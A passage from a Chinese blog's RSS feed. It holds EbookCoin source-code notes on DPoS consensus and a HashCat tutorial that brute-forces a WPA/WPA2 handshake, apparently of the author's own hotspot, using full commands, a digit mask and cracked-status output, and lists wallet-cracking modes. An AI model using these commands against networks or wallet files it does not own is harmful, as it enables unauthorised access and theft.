data-url="aHR0cDovL3psLnlpYml0ZS5jb20vcG9pbnQvMjAxNC8wMjA2LzE0NDQwLnNodG1s" title="http://zl.yibite.com/point/2014/0206/14440.shtml">为什么PoS与PoW不具有可比性<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9vY3RvdmVyc2UuZ2l0aHViLmNvbS8=" title="https://octoverse.github.com/">GitHub 官方报告<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzQtJUU1JUJDJTgwJUU1JThGJTkxJUU1JUFFJTlFJUU4JUI3JUI1LzAtJUU1JThBJUEwJUU1JUFGJTg2JUU0JUI4JThFJUU4JUE3JUEzJUU1JUFGJTg2LzMtJUU0JUI4JTg5JUU1JUJDJUEwJUU1JTlCJUJFJUU4JUFFJUE5JUU0JUJEJUEwJUU1JTg1JUE4JUU5JTlEJUEyJUU2JThFJThDJUU2JThGJUExJUU1JThBJUEwJUU1JUFGJTg2JUU4JUE3JUEzJUU1JUFGJTg2JUU2JThBJTgwJUU2JTlDJUFGLmh0bWw=" title="http://bitcoin-on-nodejs.ebookchain.org/4-%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/0-%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/3-%E4%B8%89%E5%BC%A0%E5%9B%BE%E8%AE%A9%E4%BD%A0%E5%85%A8%E9%9D%A2%E6%8E%8C%E6%8F%A1%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E6%8A%80%E6%9C%AF.html">三张图让你全面掌握加密解密技术<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2JpdGNvaW4tb24tbm9kZWpzLmVib29rY2hhaW4ub3JnLzQtJUU1JUJDJTgwJUU1JThGJTkxJUU1JUFFJTlFJUU4JUI3JUI1LzEtJUU1JTkxJUJEJUU0JUJCJUE0JUU4JUExJThDJUU4JUFFJUJFJUU4JUFFJUExLzEtY29tbWFuZGVyJUU0JUJCJThCJUU3JUJCJThELmh0bWw=" title="http://bitcoin-on-nodejs.ebookchain.org/4-%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/1-%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%AE%BE%E8%AE%A1/1-commander%E4%BB%8B%E7%BB%8D.html">commander介绍<i class="fa fa-external-link"></i></span></li></ul><hr><ul><li><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ltZmx5L2JpdGNvaW5ib29r" title="https://github.com/imfly/bitcoinbook">精通比特币（英文）<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL2Jvb2suOGJ0Yy5jb20vbWFzdGVyX2JpdGNvaW4=" title="http://book.8btc.com/master_bitcoin">精通比特币（中文）<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovLzhidGMuY29tLy10aHJlYWQtMzY2MjItMS0xLmh0bWw=" title="http://8btc.com/-thread-36622-1-1.html">《精通加密货币》作者Andreas问答<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS93aGF0LWlzLWJsb2NrY2hhaW4=" title="http://www.8btc.com/what-is-blockchain">区块链是什么<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS93aWtpL2JpdGNvaW4tYS1wZWVyLXRvLXBlZXItZWxlY3Ryb25pYy1jYXNoLXN5c3RlbQ==" title="http://www.8btc.com/wiki/bitcoin-a-peer-to-peer-electronic-cash-system">比特币白皮书：一种点对点的电子现金系统 (ZH)<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS9iaXQtZ29sZA==" title="http://www.8btc.com/bit-gold">尼克·萨博《比特金（BitGold）》白皮书<i class="fa fa-external-link"></i></span></p></li><li><p><span class="exturl" data-url="aHR0cDovL3d3dy44YnRjLmNvbS9iYWl6aGFudGluZ2ppYW5nanVu" title="http://www.8btc.com/baizhantingjiangjun">拜占庭将军问题深入探讨 <i class="fa fa-external-link"></i></span></p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2></li></ul><p>《Node.js区块链开发》 这本是，从源码级的知识，实现了一个 亿书区块链的项目，知识是比较综合的，不过美中不足的是对于源码的讲解时不够深入，不够实际上还是我自己太菜了。。。</p><p>总之，是一本好书，而且作者把书放在网上免费阅读，开源精神万岁！</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/06/02/BC_Book_NodeJs%E5%8C%BA%E9%93%BE%E5%BC%80%E5%8F%91/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x8 FIN</title>
      <link>https://www.diglp.xyz/2018/05/30/EbookCoin_0x8_FIN/</link>
      <guid>https://www.diglp.xyz/2018/05/30/EbookCoin_0x8_FIN/</guid>
      <pubDate>Tue, 29 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p></blockquote><p>这章是本书的，区块链项目的最后的一个部分了</p><h2 id="DPoS机制"><a href="#DPoS机制" class="headerlink" title="DPoS机制"></a>DPoS机制</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>很多人说，整个区块链就是个分布式的软件嘛。实际不然，区块链的灵魂，就是存在于共识这两个字，共识才是区块链的灵魂。</p><hr><p>前面的博文其实也是讲过共识的这个东西。在区链里的这个概念太重要了。</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei8yMDE4LzAzLzE0L0J5emFudGl1bS8=" title="https://blog.diglp.xyz/2018/03/14/Byzantium/">拜占庭将军与共识算法<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmRpZ2xwLnh5ei8yMDE4LzAzLzA5L3B5TXlCQ18xLw==" title="https://blog.diglp.xyz/2018/03/09/pyMyBC_1/">Py源码_挖矿<i class="fa fa-external-link"></i></span></p><hr><p>“拜占庭将军问题” 就是针对分布式公式算法提出的，这个问题也是区块链产品 的核心问题.</p><blockquote><p>比特币是如何解决拜占庭将军问题的：</p><ul><li>维持周期循环，保持节点步调一致</li><li>通过算力竞赛，确保网络单点广播</li><li>通过区块链使用一个共同账本</li></ul></blockquote><p>上面的三点就是实现一个比特币的PoW机制解决 <strong>拜占庭将军问题的答案</strong>。这也给其他的答案提供了重要的参考答案：</p><blockquote><p>只要保证时间统一，步调一致，单点广播，一个链条 就可以解决分布式系统的拜占庭将军问题。</p></blockquote><hr><p><strong>DPoS</strong> 机制</p><p>亿书区块链由受托人来创建区块，受托人是来自于用户节点的信任，通过推广和投票实现前 101名。这一就可以被系统接纳作为为真正的可以处理新区块的节点，并且可以得到区块奖励。至之于PoW的共识算法，需要最大算力。DPoS算是发挥了社区力量。不过实际上，通过票选这样的东西，我不是很看好，这样极大的提高了准入门槛。使得，投票，拉票这样的模式，又一次搬上了BC，区链的节点被固定在了这百来个节点之上。</p><p>在DPoS的过程中是存在了这样的几个过程：</p><ul><li>注册受托人，接收投票<ul><li>用户申请自己成为受托人，可以想做就是被选举人</li><li>接收投票</li></ul></li><li>维持循环，调整受托人<ul><li>块周期：时段周期，也就是出块时间</li><li>受托人周期：称为循环周期，每101个区块，重新产生了受托节点的名单。</li><li>奖励周期：由区块链的高度，来不断的调整区块奖励的量<br>块周期最短 10s，受托人周期 16min， 区块奖励周期 不确定</li></ul></li><li>循环产生新区块，广播<ul><li>源码</li></ul></li></ul><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul><li>./modules/delegates.js</li><li>./modules/round.js</li><li>./modules/accounts.js</li><li>./helper/slots.js</li></ul><p>delegates.js 受托人的相函数，申请，投票等</p><p>round.js 受托人的循环周期</p><p>accounts.js 实现用户的投票功能</p><p>slots.js </p><h3 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h3><ul><li><p>注册受托人</p><p>  在网络上注册成为一个受托人 的函数实现</p><pre><code>&quot;put /&quot;: &quot;addDelegate&quot;</code></pre><p>  上面是绑定的路由接口，下面的是具体的功能实现</p><pre><code>shared.addDelegate = function (req, cb) {    var body = req.body;    library.scheme.validate(body, {        ... // 对象结构验证        },        required: [&quot;secret&quot;]    }, function (err) {        if (err) {            return cb(err[0].message);        }        var hash = crypto.createHash(&apos;sha256&apos;).update(body.secret, &apos;utf8&apos;).digest();        var keypair = ed.MakeKeypair(hash);        // 验证密码        if (body.publicKey) {            if (keypair.publicKey.toString(&apos;hex&apos;) != body.publicKey) {                return cb(&quot;Invalid passphrase&quot;);            }        }        library.balancesSequence.add(function (cb) {            if (body.multisigAccountPublicKey &amp;&amp; body.multisigAccountPublicKey != keypair.publicKey.toString(&apos;hex&apos;)) {                modules.accounts.getAccount({publicKey: body.multisigAccountPublicKey}, function (err, account) {                    if (err) {                        return cb(err.toString());                    }                            ... //                    modules.accounts.getAccount({publicKey: keypair.publicKey}, function (err, requester) {                        ... //                        try {                            // 这里创建一个交易，里面的type就是委托                            var transaction = library.logic.transaction.create({                                type: TransactionTypes.DELEGATE,                                username: body.username,                                sender: account,                                keypair: keypair,                                secondKeypair: secondKeypair,                                requester: keypair                            });                        } catch (e) {                            return cb(e.toString());                        }                        modules.transactions.receiveTransactions([transaction], cb);                    });                });            } else {                ... //</code></pre></li></ul><hr><ul><li><p>投票</p><p>  同样的这也是一种交易方式，最早是出现在了 0x6 里面，作为一种 TYPE 出现。在 accounts 里面实现的。</p></li></ul><hr><ul><li><p>块周期</p><p>  这个周期可能是类比与 PoW 里面的一个块的计算周期，比特币的周期是 10分钟左右，因为 PoW 是基于概率出块的。所以是左右。但是在DPoS的机制下，在 ebook 里面是准确的 10秒钟的出块时间。</p><ul><li>Epoch    时期；新纪元；新时代；阶段</li><li><p>Slot    槽，窗口</p><p>时间的计算是通过这两个函数得到的时间节点，第一个是硬编码的创世时间，第二个是当前的时间</p><p>  function beginEpochTime() {</p><pre><code>var d = new Date(Date.UTC(2016, 5, 20, 0, 0, 0, 0)); //Testnet starts from 2016.6.20return d;</code></pre><p>  }</p><p>  function getEpochTime(time) {</p><pre><code>if (time === undefined) {    time = (new Date()).getTime();    // 这里存在的问题是，这个是直接获取本地时间，如果不同的机器之间的本地时间是存在偏差的，那么可能导致时间不准}var d = beginEpochTime();var t = d.getTime();return Math.floor((time - t) / 1000);</code></pre><p>  }</p><p>前面讲到亿书的。出块时间是 10s 所以这里的块数，直接是返回了快创世时间，对区块周期的取整</p><p>  getSlotNumber: function(epochTime) {</p><pre><code>if (epochTime === undefined) {    epochTime = this.getTime()}// 这里就是直接返回了return Math.floor(epochTime / constants.slots.interval);</code></pre><p>  },</p><p><strong>参数的意义</strong></p><p>这些值，出块时间必须10S吗？节点个数必须是 101个吗？ 如果我们对这个模式进行合理演绎，只有一个节点，这样的效率就得到了极大的提高，不过实际上，这就是一个单点系统，安全性就是 0 了，所以这个是一个折衷的过程。</p></li></ul></li></ul><hr><ul><li><p>受托人周期</p><p>  作为中心节点的受托人的循环周期，前面有讲是 101 个区块周期，发生一次调整。及时更换公信节点。网络是随机的在101个节点中选取产出者，不过每个节点在一个周期内都是会有一次机会产出新的块的(只是顺序随机)。</p><p>  这样在每个区块的信息里面，会有 区块高度 (height) 和 产生机器的公钥(Generator Public Key)是严格对应的.在运行的节点，会有一个表，是用来维护当前的 受托人的内容的，具体的实现如下，看起来有点难受</p><pre><code>Round.prototype.tick = function (block, cb) {    function done(err) {        cb &amp;&amp; setImmediate(cb, err);    }    modules.accounts.mergeAccountAndGet({        ... //        // 计算当前的委托人周期轮数，是可以通过其进行计算的 r=h/101        var nextRound = self.calc(block.height + 1);</code></pre></li></ul><pre><code>        if (round !== nextRound || block.height == 1) {            // 如果已经开始了下一轮的受托人循环            if (privated.delegatesByRound[round].length == constants.delegates || block.height == 1 || block.height == 101) {                // 确认满足了，新的一轮的条件                var outsiders = [];                async.series([                    function (cb) {                        // 创世区块                        if (block.height != 1) {                            // 这里是对受托人进行查表。                            modules.delegates.generateDelegateList(block.height, function (err, roundDelegates) {                                if (err) {                                    return cb(err);                                }                                // 遍历查到的                                for (var i = 0; i &lt; roundDelegates.length; i++) {                                    // 在当前的列表中没有新的一轮的节点地址                                    if (privated.delegatesByRound[round].indexOf(roundDelegates[i]) == -1) {                                        outsiders.push(modules.accounts.generateAddressByPublicKey(roundDelegates[i]));                                    }                                }                                cb();                            });                        } else {                            cb();                        }                    },                    function (cb) {                    ... //                    },                    function (cb) {                        // 在后面进行票数更新                        self.getVotes(round, function (err, votes) {                            if (err) {                                return cb(err);                            }                            async.eachSeries(votes, function (vote, cb) {                                // 查询数据库，获取当前状态                                library.dbLite.query(&apos;update mem_accounts set vote = vote + $amount where address = $address&apos;, {                                    address: modules.accounts.generateAddressByPublicKey(vote.delegate),                                    amount: vote.amount                                }, cb);                            }, function (err) {                                self.flush(round, function (err2) {                                    cb(err || err2);                                });                            })                        });                    },                    function (cb) {                        // 对读出的节点票选数进行更新                        var roundChanges = new RoundChanges(round);                        async.forEachOfSeries(privated.delegatesByRound[round], function (delegate, index, cb) {                            var changes = roundChanges.at(index);                            modules.accounts.mergeAccountAndGet({                                publicKey: delegate,                                balance: changes.balance,                                u_balance: changes.balance,                                blockId: block.id,                                round: modules.round.calc(block.height),                                fees: changes.fees,                                rewards: changes.rewards                            }, function (err) {                                if (err) {                                    return cb(err);                                }                                if (index === privated.delegatesByRound[round].length - 1) {                                    modules.accounts.mergeAccountAndGet({                                        publicKey: delegate,                                        balance: changes.feesRemaining,                                        u_balance: changes.feesRemaining,                                        blockId: block.id,                                        round: modules.round.calc(block.height),                                        fees: changes.feesRemaining                                    }, cb);                                } else {                                    cb();                                }                            });                        }, cb);                    },                    function (cb) {                        // 这里是对每个票选项的数据库回写                        self.getVotes(round, function (err, votes) {                            if (err) {                                return cb(err);                            }                            async.eachSeries(votes, function (vote, cb) {                                library.dbLite.query(&apos;update mem_accounts set vote = vote + $amount where address = $address&apos;, {                                    address: modules.accounts.generateAddressByPublicKey(vote.delegate),                                    amount: vote.amount                                }, cb);                            }, function (err) {                                library.bus.message(&apos;finishRound&apos;, round);                                self.flush(round, function (err2) {                                    cb(err || err2);                                });                            })                        });                    }                ], function (err) {                    // 删除临时空间                    delete privated.feesByRound[round];                    delete privated.rewardsByRound[round];                    delete privated.delegatesByRound[round];                    done(err);                });            } else {                done();            }        } else {            done();        }    });}</code></pre><hr><ul><li><p>奖励周期</p><p>  在亿书的项目中，类似于BTC的四年一减产1/2的的情况，亿书的区块奖励一样的是，随着不同的时间进行衰减。在亿书中，最后ed区块奖励是衰减到一个定值的，意味着在后面的时期，会保持着不断的同比增发。引起适当的通胀。这也是DPoS的一个特点。</p><p>  这种，不同于 BTC 这是一种通胀货币，作者也有提到，说是担心对降低代币的价值。实际上，如果有大量的侧链，必须是要有一定的代币的产生来提供各种侧链产品的使用。不会导致<strong>主链和侧链绑定紧密，互相掣肘</strong>          </p><blockquote><p><strong>以太坊的运行，侧链应用使用主链币进行众筹时候，此消彼长，价格波动</strong></p></blockquote></li></ul><pre><code>具体的实现细节很简单，就是维护一个 reward 的值就好了。    function Milestones() {    var milestones = [        500000000, // Initial Reward        400000000, // Milestone 1        300000000, // Milestone 2        200000000, // Milestone 3        100000000  // Milestone 4    ];这里就是奖励衰减的情况的五个里程碑</code></pre><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从共识机制上理解了DPoS这种方法，之于PoW的确有很大的不同，更像是一种民主制度。通过票选我们的代表人,来实现区块的自治.</p><p><strong>时间统一，步调一致，单点广播，一个链条</strong> 便是一个分布式系统的特性.</p><p>而且有 块周期,受托人周期,奖励周期这样几个周期</p><h2 id="后"><a href="#后" class="headerlink" title="后"></a>后</h2><p>这一篇,就是关于亿书的这个工程的最后一篇源码的文章了,很美可能会有奇迹对于项目总体的一篇总结文.</p><p>一个区块链的体系,从各个部分功能的实现,和一个总体的构成,的确是一个精妙的过程.</p><p>这里对 PoW和PoS这种共识的方式,做点自己的见解. 如我们熟知的黄金一样,对于金矿的开采, 处理这一过程,实际上会消耗大量的资源和成本,实际上我们的BTC体系也是如此,会消耗大量的资源.来产生这一的一个东西.所以不赞成,向部分人说的那样,把资源消耗在了没有意义的计算上 .</p><p>像是POS这种机制,更多的是人们相信这个币是有价值的,是一种信任.和我们手上的纸币一样,其成本的价格实际上远远不足其本身的价值,只不过,是国家赋予了他的价值,我们信任它,我们认为他是有价值的,所以我们可以使用它,可是如果我们用人民币在美利坚大陆上,可能就是没有那么好使了.所以说,PoS的代币的价值是产生于我们的信任,如果存在着信任危机,那么这种币的价值是岌岌可危的.</p><p>…</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/30/EbookCoin_0x8_FIN/#disqus_thread</comments>
    </item>
    
    <item>
      <title>HackTool HashCat</title>
      <link>https://www.diglp.xyz/2018/05/28/HackTool_HashCat/</link>
      <guid>https://www.diglp.xyz/2018/05/28/HackTool_HashCat/</guid>
      <pubDate>Sun, 27 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot; title=&quot;前&quot;&gt;&lt;/a&gt;前&lt;/h2&gt;&lt;p&gt;这个 catalogue ,用来记录一些炫酷好玩的HackTool.
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这个 catalogue ,用来记录一些炫酷好玩的HackTool. 属于没有什么技术深度,又是比较好玩炫酷的东西.</p><p>作为第一篇,这里就介绍一下,这个 <strong>HashCat</strong> 的项目吧.</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhc2hjYXQ=" title="https://github.com/hashcat">HashCat 项目地址<i class="fa fa-external-link"></i></span></p></blockquote><h2 id="What-is-HashCat"><a href="#What-is-HashCat" class="headerlink" title="What is HashCat"></a>What is HashCat</h2><p>哈希猫??? Cat 在美英里面,是工具集的意思了,所以　Hashcat是一款开源密码恢复工具，我们可以用它来攻击160多种哈希类型的密码, 通过的就是我们的 <strong>爆破(brute force)</strong>  工具. 其具体的爆破过程, 使用GPU算力,对所有的主流hash 都有很好的支持. </p><p>这里,做一个简单的基准测试:</p><pre><code>PS C:\Users\R4y\hashcat-4.1.0&gt; .\hashcat64.exe -b -w 3hashcat (v4.1.0) starting in benchmark mode...OpenCL Platform #1: Advanced Micro Devices, Inc.================================================* Device #1: Tahiti, 2393/3072 MB allocatable, 28MCU* Device #2: AMD FX(tm)xxxx Processor, skipped.Benchmark relevant options:===========================* --workload-profile=3Hashmode: 0 - MD5Speed.Dev.#1.....:   955.9 MH/s (59.76ms) @ Accel:128 Loops:64 Thr:256 Vec:1Hashmode: 100 - SHA1Speed.Dev.#1.....:  1082.1 MH/s (53.82ms) @ Accel:128 Loops:64 Thr:256 Vec:1Hashmode: 1400 - SHA-256Speed.Dev.#1.....:   618.6 MH/s (94.45ms) @ Accel:128 Loops:64 Thr:256 Vec:1Hashmode: 1700 - SHA-512Speed.Dev.#1.....: 49115.4 kH/s (74.25ms) @ Accel:32 Loops:16 Thr:256 Vec:1Hashmode: 2500 - WPA/WPA2 (Iterations: 4096)Speed.Dev.#1.....:   120.3 kH/s (53.15ms) @ Accel:128 Loops:32 Thr:256 Vec:1Hashmode: 1000 - NTLMSpeed.Dev.#1.....:  2314.9 MH/s (101.20ms) @ Accel:256 Loops:128 Thr:256 Vec:1Hashmode: 3000 - LMSpeed.Dev.#1.....:  7699.6 MH/s (60.40ms) @ Accel:64 Loops:1024 Thr:256 Vec:1Hashmode: 5500 - NetNTLMv1 / NetNTLMv1+ESSSpeed.Dev.#1.....:  2272.6 MH/s (102.62ms) @ Accel:256 Loops:128 Thr:256 Vec:1Hashmode: 5600 - NetNTLMv2Speed.Dev.#1.....: 22629.1 kH/s (80.76ms) @ Accel:32 Loops:8 Thr:256 Vec:1Hashmode: 1500 - descrypt, DES (Unix), Traditional DESSpeed.Dev.#1.....:   272.7 MH/s (53.13ms) @ Accel:2 Loops:1024 Thr:256 Vec:1...</code></pre><p>发现其综合的计算能力,还是很强的, 这次我们的 WPA 也可以到 120kH/s 也就是12W的级别. 而且根据:</p><pre><code>&gt; hashcat help</code></pre><p>里可见,其支持的种类还是相当之多的.特别是,这里,还有这几个选项.所以,密码一定要足够强~</p><pre><code>11300 | Bitcoin/Litecoin wallet.dat                      | Password Managers12700 | Blockchain, My Wallet                            | Password Managers15200 | Blockchain, My Wallet, V2                        | Password Managers16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers15700 | Ethereum Wallet, SCRYPT                          | Password Managers16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers</code></pre><h2 id="Start-From-Now"><a href="#Start-From-Now" class="headerlink" title="Start From Now"></a>Start From Now</h2><p>这里, 就使用 HC 来破解一下,我们的 Wifi 密码吧. 这里的离线密码文件是 <strong>*.cap</strong> . 使用 AirCrack-ng 工具集拿到的,具体的过程,后面闲的话,可能是会有教程的.</p><pre><code>hashcat  –help                 #查看帮助文档General:-m   （–hash-type=NUM）         #hash种类，下面有列表，后面跟对应数字-D     –opencl-device-types     | Str| OpenCL device-types to use, separate with comma   #选择用CPU还是GPU来破解-a    （–attack-mode=NUM）          #破解模式，下面也有列表</code></pre><p>attack-mode：</p><ul><li>0 = Straight   （字典破解）</li><li>1 = Combination  （组合破解）</li><li>2 = Toggle-Case</li><li>3 = Brute-force  （掩码暴力破解）</li><li>4 = Permutation   （组合破解）</li><li>5 = Table-Lookup</li></ul><p>根据 help 文档,我们的启动参数如下</p><pre><code>./hashcat64.exe -a 3  -m 2500 &quot;J:\h60.hccap&quot; --session=all -o &quot;C:\result\asd.found2500.txt&quot; --outfile-format=2 -w 3  -i --increment-min=8 --increment-max=10 -1 ?d?d?d?d?d?d?d?d?d?d ?1?1?1?1?1?1?1?1?1?d</code></pre><p>参数说明, 可以看出 , </p><pre><code>-m [type] [in_file] -o [out_file] [optional]</code></pre><p>这里使用.8位到十位的递增模式, 其掩码为 ?d?d?d… 这里的D就是指的数字的意思.一个回车执行破解过程:现在是破解中</p><pre><code>Session..........: allStatus...........: ExhaustedHash.Type........: WPA/WPA2Hash.Target......: Huawei_H60_9a79 (AP:88:28:b3:f6:2c:e6 STA:48:8a:d2:7b:8b:6e)Time.Started.....: Fri Jun 08 04:07:25 2018 (2 hours, 9 mins)Time.Estimated...: Fri Jun 08 06:17:11 2018 (0 secs)Guess.Mask.......: ?1?1?1?1?1?1?1?1?1 [9]Guess.Charset....: -1 ?d?d?d?d?d?d?d?d?d?d, -2 Undefined, -3 Undefined, -4 UndefinedGuess.Queue......: 1/2 (50.00%)Speed.Dev.#1.....:   128.4 kH/s (52.72ms) @ Accel:128 Loops:32 Thr:256 Vec:1Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) SaltsProgress.........: 1000000000/1000000000 (100.00%)Rejected.........: 0/1000000000 (0.00%)Restore.Point....: 100000000/100000000 (100.00%)Candidates.#1....: 689009973 -&gt; 676464973HWMon.Dev.#1.....: Temp: 65c Fan: 51% Util: 99% Core:1050MHz Mem:1250MHz Bus:16</code></pre><p>找到Key之后: 这里的密码选取是 1234567890 所以跑数据的过程,还是比较久的.</p><pre><code>Session..........: allStatus...........: CrackedHash.Type........: WPA/WPA2Hash.Target......: Huawei_H60_9a79 (AP:88:28:b3:f6:2c:e6 STA:48:8a:d2:7b:8b:6e)Time.Started.....: Fri Jun 08 06:17:12 2018 (2 hours, 8 mins)Time.Estimated...: Fri Jun 08 08:25:48 2018 (0 secs)Guess.Mask.......: ?1?1?1?1?1?1?1?1?1?d [10]Guess.Charset....: -1 ?d?d?d?d?d?d?d?d?d?d, -2 Undefined, -3 Undefined, -4 UndefinedGuess.Queue......: 2/2 (100.00%)Speed.Dev.#1.....:   128.5 kH/s (53.14ms) @ Accel:128 Loops:32 Thr:256 Vec:1Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 991821824/10000000000 (9.92%)Rejected.........: 0/991821824 (0.00%)Restore.Point....: 99090432/1000000000 (9.91%)Candidates.#1....: 1890099734 -&gt; 1549567890HWMon.Dev.#1.....: Temp: 65c Fan: 52% Util: 99% Core:1050MHz Mem:1250MHz Bus:16</code></pre><p>上面的过程 ,对于 10^10 的尝试在 2Hr 里有了结果. 结果保存在我们的目标文件夹中,密码是1234567890.</p><hr><p><strong>注意</strong></p><p>我们通过, HashCat 使用的是 hccap 文件,我们一般 TCPDUMP 导出的是 Cap的内容, 如果直接使用的话,是会报错的.</p><pre><code>Hashfile &apos;J:\caca.cap&apos;: Invalid hccapx signature</code></pre><p>这里需要对包的格式进行转换.</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9oYXNoY2F0Lm5ldC9mb3J1bS90aHJlYWQtNjI3My5odG1s" title="https://hashcat.net/forum/thread-6273.html">官方 Issue<i class="fa fa-external-link"></i></span></p></blockquote><p>使用其,附带的工具. <strong>cap2hccapx</strong> 对其进行转换</p><pre><code>cap2hccapx &lt;out.cap&gt; -J &lt;out.hccap&gt; </code></pre><hr><p>参考文档</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9oYXNoY2F0Lm5ldC9oYXNoY2F0Lw==" title="https://hashcat.net/hashcat/">hashcat官网<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9oYXNoY2F0Lm5ldC93aWtpL2Rva3UucGhwP2lkPWNyYWNraW5nX3dwYXdwYTI=" title="https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2">Cracking WPA/WPA2 with oclHashcat<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9oYXNoY2F0Lm5ldC9jYXAyaGNjYXAv" title="https://hashcat.net/cap2hccap/">在线cap转为hccap格式<i class="fa fa-external-link"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhc2hjYXQ=" title="https://github.com/hashcat">HashCat 项目地址<i class="fa fa-external-link"></i></span></li></ul>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/05/28/HackTool_HashCat/#disqus_thread</comments>
    </item>
    
    <item>
      <title>EbookCoin 源码 0x7</title>
      <link>https://www.diglp.xyz/2018/05/28/BC_EbookCoin_0x7/</link>
      <guid>https://www.diglp.xyz/2018/05/28/BC_EbookCoin_0x7/</guid>
      <pubDate>Sun, 27 May 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;h2 id=&quot;前&quot;&gt;&lt;a href=&quot;#前&quot; class=&quot;headerlink&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>这次的一个period是基于《Nodejs区块链开发》这本书的的区块链项目–亿书，的源码学习笔记</p><blockquote><p>EbookCoin<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0Vib29rY29pbi9lYm9va2NvaW4uZ2l0" title="https://github.com/Ebookcoin/ebookcoin.git">项目地址<i class="fa fa-external-link"></i></span></p><p>要把不。。</p></blockquote><h2 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>书中的这章实际上是一个狭义上的区块链，把区块链作为一个数据结构的，把它存储为一个文件形式的，不过大多数是存储在一个数据库中的。每个区块的记录都是时间上的上一个区块。所以作为一个链，可以直接回溯到第一个区块。一个区块的ID，可就是作为区块的检验和认证。</p><p>与区块链对应的直接的关系的是交易表，在cryptoCurrency体系中存在着大量的交易，在区块中包含着我们的资产信息的交易表，这样就可以查到我们公信的交易记录。</p><hr><p>在区块链中的写操作，实际上就是在区块链上记录信息</p><p>所以在区块链上记录信息，比如这个</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9ldGhlcnNjYW4uaW8vdHgvMHgyZDZhN2IwZjZhZGVmZjM4NDIzZDRjNjJjZDhiNmNjYjcwOGRkYWQ4NWRhNWQzZDA2NzU2YWQ0ZDhhMDRhNmEy" title="https://etherscan.io/tx/0x2d6a7b0f6adeff38423d4c62cd8b6ccb708ddad85da5d3d06756ad4d8a04a6a2">Peking University teachers and classmates<i class="fa fa-external-link"></i></span></p></blockquote><p>或者又是一个<strong>智能合约</strong> 可以使得区块链系统，在特定的情况下执行一个目的的合约条件.</p><p>一个节点的操作:有创建新区块，和同步区块并解决分叉。</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><ul><li>./modules/blocks.js</li><li>./logic/block.js</li><li>./module/loader.js</li></ul><p>blocks.js 